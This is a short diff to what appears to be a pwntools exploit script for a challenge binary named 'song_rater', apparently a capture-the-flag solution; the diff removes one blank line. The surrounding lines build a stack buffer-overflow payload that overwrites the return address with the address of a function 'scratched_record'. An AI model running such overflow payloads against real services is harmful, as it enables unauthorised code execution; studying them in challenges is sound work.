@@ -15,7 +15,6 @@ def start():
         return process('./song_rater')
 r = start()
 #========= exploit here ===================
-
 payload = b"A"*0x100
 payload += b"B"*8
 payload += p64(elf.sym.scratched_record)
